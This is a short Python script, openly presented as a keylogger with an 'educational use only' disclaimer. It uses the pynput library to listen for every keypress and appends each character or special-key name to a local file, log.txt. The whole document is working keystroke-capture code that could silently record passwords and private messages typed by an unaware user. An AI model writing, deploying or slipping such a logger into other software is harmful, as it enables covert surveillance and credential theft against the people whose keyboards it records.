# ⚠️ Educational Use Only
# This keylogger is created strictly for cybersecurity awareness and ethical learning.
# Do not use this script for any unauthorized activity.

from pynput import keyboard

def on_press(key):
    try:
        with open("log.txt", "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open("log.txt", "a") as file:
            file.write(f" [{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
